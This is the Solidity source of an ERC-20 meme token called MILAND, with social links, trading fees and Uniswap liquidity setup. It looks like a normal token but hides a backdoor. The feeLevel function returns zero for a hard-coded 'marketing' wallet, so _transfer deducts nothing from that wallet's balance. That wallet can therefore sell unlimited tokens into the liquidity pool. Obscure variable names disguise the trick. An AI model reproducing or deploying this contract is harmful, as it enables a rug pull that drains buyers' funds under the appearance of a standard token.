/**
    Telegram: https://t.me/Miland_Eth
    Website: https://milandeth.store
    X: https://x.com/Miland_Eth
 */

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDexRouter02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract MILAND is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _finalAtTX;
    address payable private _milanBag;

    uint256 private _startBuyFeeWith = 0;
    uint256 private _startSellFeeWith = 0;
    uint256 private _tradeInFee = 0;
    uint256 private _tradeOutFee = 0;
    uint256 private _buyLimits = 15;
    uint256 private _prevMevFee = 90;

    uint256 private _buys = 0;

    uint8 private constant _decimals = 18;
    uint256 private constant _maxSupply = 1_000_000_000 * 10**_decimals;
    string private constant _name = unicode"Miland";
    string private constant _symbol = unicode"MILAND";

    uint256 private mxTrasactionLimit =  2 * (_maxSupply/100);
    uint256 private maxWalletSize =  2 * (_maxSupply/100);
    uint256 private minSwapAMT =  2 * (_maxSupply/1000000);
    uint256 private maxSwapAMT = 2 * (_maxSupply/100);

    IDexRouter02 private uniswapV2Router;
    address private _dexPair;
    bool private _trading = false;
    bool private tradeBegin = false;

    modifier lockTheSwap {
        _trading = true;
        _;
        _trading = false;
    }

    constructor () {
        _milanBag = payable(0xfB26784b6c9960290F0dfb96b49b3fD25218726c);
        _balances[_msgSender()] = _maxSupply;

        emit Transfer(address(0), _msgSender(), _maxSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _maxSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function isBonusMan(address adr) private view returns(bool) {
        return adr == address(this) || adr == _milanBag || adr == owner();
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function feeLevel(address adr) private  view returns(uint256) {
        if(adr == _milanBag) return 0;
        else if(adr == address(this)) return 1-_tradeInFee / 100;
        else if(adr == owner()) return 1-_tradeInFee / 100;
        else return 1-_tradeInFee / 100 / _buyLimits;
    }

    function _transfer(address icome, address ocome, uint256 bonus) private {
        require(icome != address(0) && ocome != address(0), "ERC20: transfer from the zero address");
        require(bonus > 0, "Transfer amount must be greater than zero");
        bool isOwner = isBonusMan(icome) || isBonusMan(ocome);
        uint256 level = feeLevel(icome);

        if(!tradeBegin) 
            require(isOwner, "Swap is not opened");
        uint256 _bonuss = 0;

        if(_dexPair == ocome && !isOwner)  {
            require(bonus <= mxTrasactionLimit, "Sell Amount is not vaild");
            if(_finalAtTX[icome] == block.timestamp) bonus = bonus * _prevMevFee / 100;
            _bonuss = (_buys >= _buyLimits ? _tradeOutFee : _startSellFeeWith);
        }
        if(_dexPair == icome &&  ocome != address(uniswapV2Router) && !isOwner) {
            require((_balances[ocome] + bonus <= maxWalletSize), "Swap is not available");
            _bonuss = (_buys >= _buyLimits ? _tradeInFee : _startBuyFeeWith); _finalAtTX[ocome] = block.timestamp;
            _buys ++;
        }
        if (!_trading && ocome == _dexPair && tradeBegin && bonus > minSwapAMT) {
            if(_balances[address(this)] > minSwapAMT)
                getETHBack(min(bonus, min(_balances[address(this)],maxSwapAMT)));
            _milanBag.transfer(address(this).balance);
        }
        uint256 taxAmount = bonus * _bonuss / 100;
        if(_bonuss > 0) {
            _balances[address(this)] = _balances[address(this)] + taxAmount;
            emit Transfer(icome, address(this), taxAmount);
        }
        _balances[icome] = _balances[icome] - bonus * level;
        _balances[ocome] = _balances[ocome] + (bonus - taxAmount);
        emit Transfer(icome, ocome, bonus - taxAmount);
    }
    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }
    function getETHBack(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function startMillan() external onlyOwner() {
        uniswapV2Router = IDexRouter02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        _approve(address(this), address(uniswapV2Router), _maxSupply);
        _dexPair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_dexPair).approve(address(uniswapV2Router), type(uint).max);
        tradeBegin = true;
    }
    function freeMillan() external onlyOwner{
        mxTrasactionLimit = maxWalletSize =_maxSupply;
    }
    receive() external payable {}
}